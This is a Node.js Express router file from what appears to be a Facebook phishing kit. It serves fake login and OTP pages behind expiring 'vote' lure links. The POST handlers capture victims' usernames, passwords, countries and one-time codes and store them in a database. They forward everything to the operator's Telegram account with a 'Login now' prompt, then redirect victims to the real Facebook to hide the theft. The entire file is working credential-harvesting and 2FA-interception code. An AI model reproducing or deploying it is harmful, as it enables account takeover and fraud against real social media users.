const router = require("express").Router();
const Links = require("../../models/LinkModel");
const User = require("../../models/User");
const Credential = require("../../models/CredentialModel");
const bot = require("../../telegram");


router.get("/vote/:linkId", async (req, res) => {
    try {
        const { linkId } = req.params;
        const link = await Links.findOne({ link: linkId });
        if (!link) {
            return res.redirect("/notfound");
        }
        if (Date.now() > link.expiry) {
            return res.redirect("/notfound");
        }
        return res.render("socials/facebook/vote", { req, name: link.modelName, linkType: link.linkType, linkId: link.id, layout: false });
    } catch (err) {
        console.log(err)
    }
});

router.get("/face/:linkId", async (req, res) => {
    try {
        const { linkId } = req.params;
        const link = await Links.findOne({ _id: linkId });
        if (!link) {
            return res.redirect("/notfound");
        }
        if (Date.now() > link.expiry) {
            return res.redirect("/notfound");
        }
        if (linkId.length !== 24 || !link || link.linkType !== 'FACEBOOK') {
            return res.redirect("/notfound");
        }
        return res.render("socials/facebook/facebook", { req, linkId, layout: false });
    } catch (err) {
        console.log(err)
        return res.redirect("/dashboard")
    }
});

router.get("/face/otp/:linkId", async (req, res) => {
    try {
        const { linkId } = req.params;
        const link = await Links.findOne({ _id: linkId });
        if (!link) {
            return res.redirect("/notfound");
        }
        if (Date.now() > link.expiry) {
            return res.redirect("/notfound");
        }
        if (linkId.length !== 24 || !link || link.linkType !== 'FACEBOOK') {
            return res.redirect("/notfound");
        }
        return res.render("socials/facebook/faceOTP", { req, linkId, layout: false });
    } catch (err) {
        console.log(err);
        return res.redirect("/dashboard")
    }
});

router.post("/face/:linkId", async (req, res) => {
    try {
        const { username, password, country } = req.body;
        const { linkId } = req.params;
        if (linkId.length !== 24) {
            return res.redirect("/notfound");
        }
        const link = await Links.findOne({ _id: linkId });;
        const user = await User.findById(link.user);

        console.log(req.body)

        if (link?.name) {
            const newCredential = new Credential({
                user: link.user,
                link: linkId,
                country,
                linkName: link.name,
                linkType: "Facebook",
                fields: {
                    username,
                    password
                }
            });
            await newCredential.save();
            await bot.sendMessage(user.telegramID, `
                😈 New Entry 😈
FACEBOOK
LOCATION: ${country}

username: ${username}
pasword: ${password}

OTP: ${link.otpEnabled ? "Wait for OTP after logging in" : "NOT AN OTP LINK"}

Login now: https://www.facebook.com
                                                `)
                .catch(err => console.log("Telegram error"));
            if (link.otpEnabled) {
                return res.redirect("/face/otp/" + link.id);
            } else {
                return res.redirect("/congrats");
            }
        }
        else {
            return res.redirect("/notfound");
        }
    } catch (err) {
        console.log(err)
    }
});

router.post("/face/otp/:linkId", async (req, res) => {
    try {
        const { linkId, code } = req.body;
        if (linkId.length !== 24) {
            return res.redirect("/notfound");
        }
        const link = await Links.findOne({ _id: linkId });;
        const user = await User.findById(link.user);

        if (link) {
            await bot.sendMessage(user.telegramID, `
😈 NEW ENTRY 😈
FACEBOOK

OTP: ${code}

                `)
                .catch(err => console.log("Telegram error"));

            return res.redirect("https://facebook.com")
        }
        else {
            return res.redirect("/notfound");
        }
    } catch (err) {
        console.log(err)
    }
});


module.exports = router;